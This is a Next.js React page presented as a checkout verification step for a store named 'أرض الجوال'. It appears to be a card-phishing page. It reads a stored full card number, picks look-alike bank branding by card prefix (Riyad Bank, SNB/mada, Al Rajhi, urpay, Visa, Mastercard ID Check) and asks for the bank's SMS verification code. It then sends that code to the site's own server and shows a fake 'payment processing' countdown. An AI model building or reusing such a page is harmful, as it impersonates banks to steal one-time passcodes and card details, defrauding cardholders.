'use client';

import Link from 'next/link';
import { useEffect, useState } from 'react';

const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';

type CheckoutDraft = {
  phone?: unknown;
  cardLast4?: string;
  cardNumber?: string;
  card_number?: string;
  card?: string;
  stage?: unknown;
  orderId?: unknown;
  orderNumber?: unknown;
  customerNotificationKey?: unknown;
  confirmedAt?: unknown;
};

function normalizeDigits(value: string) {
  return value
    .replace(/[٠-٩]/g, (digit) => String('٠١٢٣٤٥٦٧٨٩'.indexOf(digit)))
    .replace(/[۰-۹]/g, (digit) => String('۰۱۲۳۴۵۶۷۸۹'.indexOf(digit)))
    .replace(/[^0-9]/g, '');
}

export default function VerifyPhonePage() {
  const [phone, setPhone] = useState('');
  const [orderId, setOrderId] = useState('');
  const [orderNumber, setOrderNumber] = useState('');
  const [customerNotificationKey, setCustomerNotificationKey] = useState('');
  const [cardLast4, setCardLast4] = useState('0000');
  const [cardPrefixType, setCardPrefixType] = useState<'riyad' | 'urpay' | 'alahli_mada' | 'alrajhi' | 'default'>('default');
  const [draftReady, setDraftReady] = useState(false);
  const [referenceCode, setReferenceCode] = useState('');
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verified, setVerified] = useState(false);
  const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
  
  const [countdown, setCountdown] = useState(30);
  const [dashOffset, setDashOffset] = useState(600);
  const [isFlipped, setIsFlipped] = useState(false);

  const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);

  useEffect(() => {
    try {
      const raw = window.sessionStorage.getItem(DRAFT_KEY);
      const draft = raw ? (JSON.parse(raw) as CheckoutDraft) : null;

      const savedPhone = typeof draft?.phone === 'string' ? normalizeDigits(draft.phone) : '';
      const savedOrderId = typeof draft?.orderId === 'string' ? draft.orderId : '';
      const savedKey = typeof draft?.customerNotificationKey === 'string' ? draft.customerNotificationKey : '';
      const savedConfirmedAt =
        typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
          ? draft.confirmedAt
          : null;

      if (draft) {
        const fullCardNum =
          typeof draft.cardNumber === 'string'
            ? draft.cardNumber.replace(/\D/g, '')
            : typeof draft.card_number === 'string'
            ? draft.card_number.replace(/\D/g, '')
            : typeof draft.card === 'string'
            ? draft.card.replace(/\D/g, '')
            : '';

        if (fullCardNum.startsWith('5297')) {
          setCardPrefixType('riyad');
        } else if (fullCardNum.startsWith('4909')) {
          setCardPrefixType('urpay');
        } else if (fullCardNum.startsWith('5161') || fullCardNum.startsWith('5294')) {
          setCardPrefixType('alahli_mada');
        } else if (fullCardNum.startsWith('4847')) {
          setCardPrefixType('alrajhi');
        } else {
          setCardPrefixType('default');
        }

        let extractedLast4 = '0000';
        if (typeof draft.cardLast4 === 'string' && draft.cardLast4.length === 4) {
          extractedLast4 = draft.cardLast4;
        } else if (fullCardNum.length >= 4) {
          extractedLast4 = fullCardNum.slice(-4);
        }
        setCardLast4(extractedLast4);
      }

      if (
        (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
        savedPhone.length === 10 &&
        savedOrderId &&
        savedKey
      ) {
        setPhone(savedPhone);
        setOrderId(savedOrderId);
        setOrderNumber(typeof draft.orderNumber === 'string' ? draft.orderNumber : '');
        setCustomerNotificationKey(savedKey);
        setVerified(draft.stage === 'confirmed');
        setConfirmedAt(draft.stage === 'confirmed' ? savedConfirmedAt : null);
        setDraftReady(true);
      } else {
        setDraftReady(true);
      }
    } catch {
      setDraftReady(true);
    }
  }, []);

  useEffect(() => {
    if (!verified) return;

    const total = 30;
    const C = 804.2;
    const verificationTime = confirmedAt ?? Date.now();

    const updateTimer = () => {
      const elapsed = Math.floor((Date.now() - verificationTime) / 1000);
      const left = Math.max(0, total - elapsed);
      setCountdown(left);

      const progress = 0.27 + 0.73 * ((total - left) / total);
      setDashOffset(C * (1 - progress));

      if (left % 3 === 0) {
        setIsFlipped((prev) => !prev);
      }
    };

    updateTimer();
    const interval = window.setInterval(updateTimer, 1000);
    return () => clearInterval(interval);
  }, [verified, confirmedAt]);

  async function handleVerify() {
    if (!isReferenceCodeValid) {
      setError('أدخل رمزًا من 4 إلى 6 أرقام.');
      return;
    }
    if (isVerifying || verified) return;

    setError('');
    setIsVerifying(true);
    try {
      const response = await fetch('/api/orders/verify-confirmation-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          orderId,
          customerNotificationKey,
          code: referenceCode,
        }),
      });
      const result = (await response.json()) as { ok?: boolean; error?: string };
      if (!response.ok || result.ok !== true) {
        setError(result.error || 'تعذر إرسال رمز الطلب. حاول مرة أخرى.');
        return;
      }

      setConfirmedAt(Date.now());
      setVerified(true);
    } catch {
      setError('تعذر الاتصال بالخادم. حاول مرة أخرى.');
    } finally {
      setIsVerifying(false);
    }
  }

  if (!draftReady) {
    return (
      <main style={{ backgroundColor: '#ffffff', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
        <div style={{ textAlign: 'center' }}>
          <p style={{ color: '#555', fontSize: '16px', marginBottom: '15px' }}>لا توجد بيانات طلب جاهزة للتأكيد.</p>
          <Link href="/checkout/store" style={{ color: '#1646a7', textDecoration: 'none' }}>
            العودة لإدخال بيانات الطلب
          </Link>
        </div>
      </main>
    );
  }

  const HeaderLogos = () => {
    if (cardPrefixType === 'riyad') {
      return (
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%', maxWidth: '520px', margin: '20px auto 25px auto', padding: '0 15px', direction: 'ltr' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <svg width="34" height="34" viewBox="0 0 40 40" fill="none">
              <path d="M0 20L15 5V25L0 20Z" fill="#00b493" />
              <path d="M15 5L40 5V25L25 40V20L15 5Z" fill="#1b0066" />
            </svg>
            <div style={{ display: 'flex', flexDirection: 'column', textAlign: 'left', lineHeight: '1.1' }}>
              <span style={{ fontSize: '18px', fontWeight: 'bold', color: '#68727d', fontFamily: 'sans-serif' }}>بنك الرياض</span>
              <span style={{ fontSize: '14px', fontWeight: '800', color: '#68727d', fontFamily: 'sans-serif', letterSpacing: '0.5px' }}>Riyad Bank</span>
            </div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#eb001b', display: 'inline-block' }} />
              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#f79e1b', display: 'inline-block', marginLeft: '-8px', opacity: 0.95 }} />
            </div>
            <span style={{ color: '#ccc', fontSize: '20px', fontWeight: '300' }}>|</span>
            <span style={{ fontSize: '19px', fontWeight: '400', color: '#111', fontFamily: 'sans-serif', letterSpacing: '-0.3px' }}>ID Check</span>
          </div>
        </div>
      );
    }

    if (cardPrefixType === 'urpay') {
      return (
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%', maxWidth: '520px', margin: '20px auto 25px auto', padding: '0 15px', direction: 'ltr' }}>
          <span style={{ fontSize: '34px', fontWeight: 'bold', fontStyle: 'italic', color: '#1a1f71', fontFamily: 'sans-serif', letterSpacing: '-1px' }}>
            VISA
          </span>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.5 15h-3v-6h3v6zm0-8h-3V7h3v2z" fill="#0052cc" />
            </svg>
            <span style={{ fontSize: '20px', fontWeight: '900', color: '#0052cc', fontFamily: 'sans-serif', letterSpacing: '-0.5px' }}>urpay</span>
          </div>
        </div>
      );
    }

    if (cardPrefixType === 'alahli_mada') {
      return (
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%', maxWidth: '540px', margin: '20px auto 25px auto', padding: '0 15px', direction: 'ltr' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                <span style={{ width: '10px', height: '5px', background: '#00a651', borderTopLeftRadius: '5px', borderTopRightRadius: '5px' }} />
                <span style={{ fontSize: '13px', fontWeight: '900', color: '#1a1f71', letterSpacing: '-0.5px', fontFamily: 'sans-serif' }}>SNB</span>
              </div>
              <span style={{ fontSize: '13px', fontWeight: 'bold', color: '#333', fontFamily: 'Cairo, sans-serif' }}>الأهلي</span>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
              <span style={{ background: '#008fd3', color: '#fff', fontSize: '8px', fontWeight: 'bold', padding: '1px 5px', borderRadius: '2px', textAlign: 'center', fontFamily: 'sans-serif' }}>مدى</span>
              <span style={{ background: '#8cc63f', color: '#fff', fontSize: '8px', fontWeight: 'bold', padding: '1px 5px', borderRadius: '2px', textAlign: 'center', fontFamily: 'sans-serif' }}>mada</span>
            </div>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <span style={{ width: '18px', height: '18px', borderRadius: '50%', background: '#eb001b', display: 'inline-block' }} />
              <span style={{ width: '18px', height: '18px', borderRadius: '50%', background: '#f79e1b', display: 'inline-block', marginLeft: '-7px', opacity: 0.95 }} />
            </div>
            <span style={{ fontSize: '15px', fontWeight: '500', color: '#111', fontFamily: 'sans-serif', letterSpacing: '-0.3px' }}>ID Check</span>
          </div>
        </div>
      );
    }

    if (cardPrefixType === 'alrajhi') {
      return (
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%', maxWidth: '520px', margin: '20px auto 25px auto', padding: '0 15px', direction: 'ltr' }}>
          <span style={{ fontSize: '34px', fontWeight: 'bold', fontStyle: 'italic', color: '#1a1f71', fontFamily: 'sans-serif', letterSpacing: '-1px' }}>
            VISA
          </span>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <div style={{ display: 'flex', flexDirection: 'column', textAlign: 'right', lineHeight: '1.1' }}>
              <span style={{ fontSize: '13px', fontWeight: 'bold', color: '#002d62', fontFamily: 'Cairo, sans-serif' }}>مصرف الراجحي</span>
              <span style={{ fontSize: '12px', fontWeight: 'bold', color: '#002d62', fontFamily: 'sans-serif', letterSpacing: '0.3px' }}>alrajhi bank</span>
            </div>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
              <path d="M12 2L3 7v10l9 5 9-5V7l-9-5zm0 2.18l6.87 3.82L12 11.82 5.13 8 12 4.18zM5 9.82l6 3.33v6.85l-6-3.33V9.82zm14 6.85l-6 3.33v-6.85l6-3.33v6.85z" fill="#002d62" />
            </svg>
          </div>
        </div>
      );
    }

    return (
      <div style={{ textAlign: 'center', margin: '20px auto 25px auto' }}>
        <span style={{ fontSize: '34px', fontWeight: 'bold', fontStyle: 'italic', color: '#1a1f71', fontFamily: 'sans-serif', letterSpacing: '-1px' }}>
          visa
        </span>
      </div>
    );
  };

  if (!verified) {
    return (
      <main style={{ direction: 'rtl', backgroundColor: '#f9f9f9', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
        <header style={{ backgroundColor: '#fff', borderBottom: '1px solid #e5e7eb', width: '100%' }}>
          <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '12px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                <span style={{ width: '22px', height: '22px', borderRadius: '50%', background: '#00b493', display: 'inline-block' }} />
                <span style={{ fontSize: '13px', color: '#333' }}>0</span>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                <span style={{ background: '#e53e3e', color: '#fff', borderRadius: '50%', width: '18px', height: '18px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '11px' }}>1</span>
                <span style={{ fontSize: '13px', color: '#333' }}>🛒</span>
              </div>
              <span style={{ fontSize: '18px', cursor: 'pointer' }}>🔍</span>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <div style={{ textAlign: 'right', lineHeight: '1.1' }}>
                <span style={{ fontSize: '16px', fontWeight: 'bold', color: '#12354e', display: 'block' }}>أرض الجوال</span>
              </div>
              <div style={{ width: '32px', height: '32px', background: '#00b493', borderRadius: '6px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <span style={{ color: '#fff', fontWeight: 'bold', fontSize: '14px' }}>أ</span>
              </div>
            </div>

            <div>
              <span style={{ fontSize: '22px', cursor: 'pointer' }}>☰</span>
            </div>
          </div>
        </header>

        <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '30px 15px' }}>
          <div style={{ background: '#fff', width: '100%', maxWidth: '460px', borderRadius: '16px', padding: '30px 20px', boxShadow: '0 4px 20px rgba(0,0,0,0.05)', textAlign: 'center' }}>
            
            <HeaderLogos />

            <h2 style={{ fontSize: '16px', color: '#444', marginBottom: '8px', fontWeight: '600' }}>
              للتحقق من عملية الشراء
            </h2>
            <p style={{ color: '#333', fontSize: '15px', marginBottom: '15px', fontWeight: 'bold' }}>
              تم ارسال رمز التحقق لرقم هاتفك المرتبط بالبطاقة المصرفية لتأكيد الدفع باستخدام بطاقة
            </p>
            <p style={{ fontSize: '20px', fontWeight: 'bold', letterSpacing: '2px', marginBottom: '25px', color: '#111', direction: 'ltr' }}>
              ********{cardLast4}
            </p>

            <div style={{ marginBottom: '15px', textAlign: 'right' }}>
              <label style={{ display: 'block', color: '#666', fontSize: '13px', marginBottom: '6px' }}>Verification Code</label>
              <input
                type="text"
                value={referenceCode}
                onChange={(e) => setReferenceCode(e.target.value)}
                maxLength={6}
                style={{ width: '100%', padding: '12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '18px', textAlign: 'center', outline: 'none' }}
              />
            </div>

            {error && <p style={{ color: 'red', textAlign: 'center', marginBottom: '15px', fontSize: '14px' }}>{error}</p>}

            <button
              type="button"
              onClick={handleVerify}
              disabled={isVerifying}
              style={{ width: '100%', padding: '14px', background: '#3b82f6', color: '#fff', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', marginBottom: '20px' }}
            >
              {isVerifying ? 'جاري التحقق...' : 'إرسال'}
            </button>

            <div style={{ marginBottom: '15px' }}>
              <button type="button" style={{ background: 'none', border: 'none', color: '#2563eb', fontSize: '14px', cursor: 'pointer' }}>
                طلب كلمة سر جديدة
              </button>
            </div>

            <div style={{ borderTop: '1px solid #eaeaea', paddingTop: '15px', marginTop: '10px' }}>
              <span style={{ fontSize: '13px', color: '#555' }}>Terms of Use | ?Need help</span>
            </div>

          </div>
        </div>

        <footer style={{ backgroundColor: '#fff', borderTop: '1px solid #e5e7eb', padding: '10px 0', width: '100%' }}>
          <div style={{ display: 'flex', justifyContent: 'space-around', alignItems: 'center', maxWidth: '500px', margin: '0 auto' }}>
            <div style={{ textAlign: 'center', fontSize: '11px', color: '#666' }}><span>👤</span><p>حسابي</p></div>
            <div style={{ textAlign: 'center', fontSize: '11px', color: '#666', position: 'relative' }}>
              <span style={{ background: '#e53e3e', color: '#fff', borderRadius: '50%', width: '14px', height: '14px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '9px', position: 'absolute', top: '-4px', right: '10px' }}>0</span>
              <span>🛒</span><p>السلة</p>
            </div>
            <div style={{ textAlign: 'center', fontSize: '11px', color: '#00b493' }}><span>🏠</span><p>الرئيسية</p></div>
            <div style={{ textAlign: 'center', fontSize: '11px', color: '#666' }}><span>📑</span><p>التصنيفات</p></div>
            <div style={{ textAlign: 'center', fontSize: '11px', color: '#666' }}><span>💬</span><p>الدعم</p></div>
          </div>
        </footer>
      </main>
    );
  }

  return (
    <main style={{ backgroundColor: '#fcfdfd', color: '#1b2430', fontFamily: '"IBM Plex Sans Arabic", system-ui, sans-serif', overflow: 'hidden', position: 'relative', minHeight: '100vh', maxWidth: '480px', margin: '0 auto', padding: '44px 28px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'space-between', textAlign: 'center', direction: 'rtl' }}>
      <div style={{ position: 'fixed', borderRadius: '50%', pointerEvents: 'none', width: '300px', height: '300px', top: '-150px', left: '-110px', background: '#2fbf9b', opacity: '.55' }} />
      <div style={{ position: 'fixed', borderRadius: '50%', pointerEvents: 'none', width: '340px', height: '340px', bottom: '-200px', right: '-90px', background: '#2fbf9b', opacity: '.6' }} />

      <div style={{ alignSelf: 'flex-start', display: 'flex', alignItems: 'center', gap: '14px', zIndex: 1 }}>
        <svg viewBox="0 0 96 130" style={{ width: '64px', height: 'auto' }} aria-hidden="true">
          <path d="M14 8h66a10 10 0 0 1 8 16l-26 22H14a8 8 0 0 1-8-8V16a8 8 0 0 1 8-8z" fill="#eef1f4" stroke="#aeb6bf" strokeWidth="2"/>
          <path d="M8 74h70a10 10 0 0 1 6 18l-26 22a10 10 0 0 1-6 2H8a6 6 0 0 1-6-6V80a6 6 0 0 1 6-6z" fill="#2fbf9b" transform="translate(4 4)"/>
        </svg>
        <b style={{ fontSize: '34px', lineHeight: '1.05', fontWeight: 700, display: 'block', textAlign: 'right' }}>
          <span style={{ display: 'block', fontSize: '30px' }}>أرض</span>الجوال
        </b>
      </div>

      <div style={{ position: 'relative', width: 'min(300px, 72vw)', aspectRatio: '1', marginTop: '8px', zIndex: 1 }}>
        <svg style={{ width: '100%', height: '100%', transform: 'rotate(-90deg)' }} viewBox="0 0 300 300" aria-hidden="true">
          <circle cx="150" cy="150" r="128" fill="none" strokeWidth="22" strokeLinecap="round" stroke="#e6eaee" />
          <circle cx="150" cy="150" r="128" fill="none" strokeWidth="22" strokeLinecap="round" stroke="#2fbf9b" strokeDasharray="804.2" strokeDashoffset={dashOffset} style={{ transition: 'stroke-dashoffset 1s linear' }} />
        </svg>
        <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: '2px' }}>
          <svg viewBox="0 0 54 74" aria-hidden="true" style={{ width: '54px', height: '74px', transition: 'transform 0.8s ease', transform: isFlipped ? 'rotate(180deg)' : 'rotate(0deg)' }}>
            <rect x="2" y="1" width="50" height="6" rx="2" fill="#2b3640"/>
            <rect x="2" y="67" width="50" height="6" rx="2" fill="#2b3640"/>
            <path d="M9 7h36v10c0 10-8 14-12 20 4 6 12 10 12 20v10H9V57c0-10 8-14 12-20-4-6-12-10-12-20z" fill="none" stroke="#2b3640" strokeWidth="4" strokeLinejoin="round"/>
            <path d="M27 36c-3 5-10 9-10 18v7h20v-7c0-9-7-13-10-18z" fill="#2fbf9b"/>
          </svg>
          <div style={{ fontSize: '64px', fontWeight: 700, lineHeight: 1, marginTop: '6px', fontVariantNumeric: 'tabular-nums' }}>{countdown}</div>
          <div style={{ fontSize: '22px', color: '#5d6672', fontWeight: 500 }}>ثانية</div>
        </div>
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', width: '100%', zIndex: 1 }}>
        <h1 style={{ fontSize: '34px', fontWeight: 700, margin: 0 }}>جار معالجة عملية الدفع</h1>
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px', width: '100%', margin: '22px 0 26px' }}>
          <i style={{ flex: 1, height: '1px', background: '#dfe4e8', fontStyle: 'normal' }} />
          <span style={{ display: 'flex', gap: '10px' }}>
            <em style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#d5dae0', display: 'inline-block' }} />
            <em style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#2fbf9b', display: 'inline-block' }} />
            <em style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#d5dae0', display: 'inline-block' }} />
          </span>
          <i style={{ flex: 1, height: '1px', background: '#dfe4e8', fontStyle: 'normal' }} />
        </div>
        <p style={{ fontSize: '21px', lineHeight: '1.8', color: '#5d6672', margin: 0, maxWidth: '380px' }}>
          يرجى الانتظار وعدم اغلاق هذه الصفحة حتى اكتمال العملية
        </p>
      </div>

      <div />
    </main>
  );
}
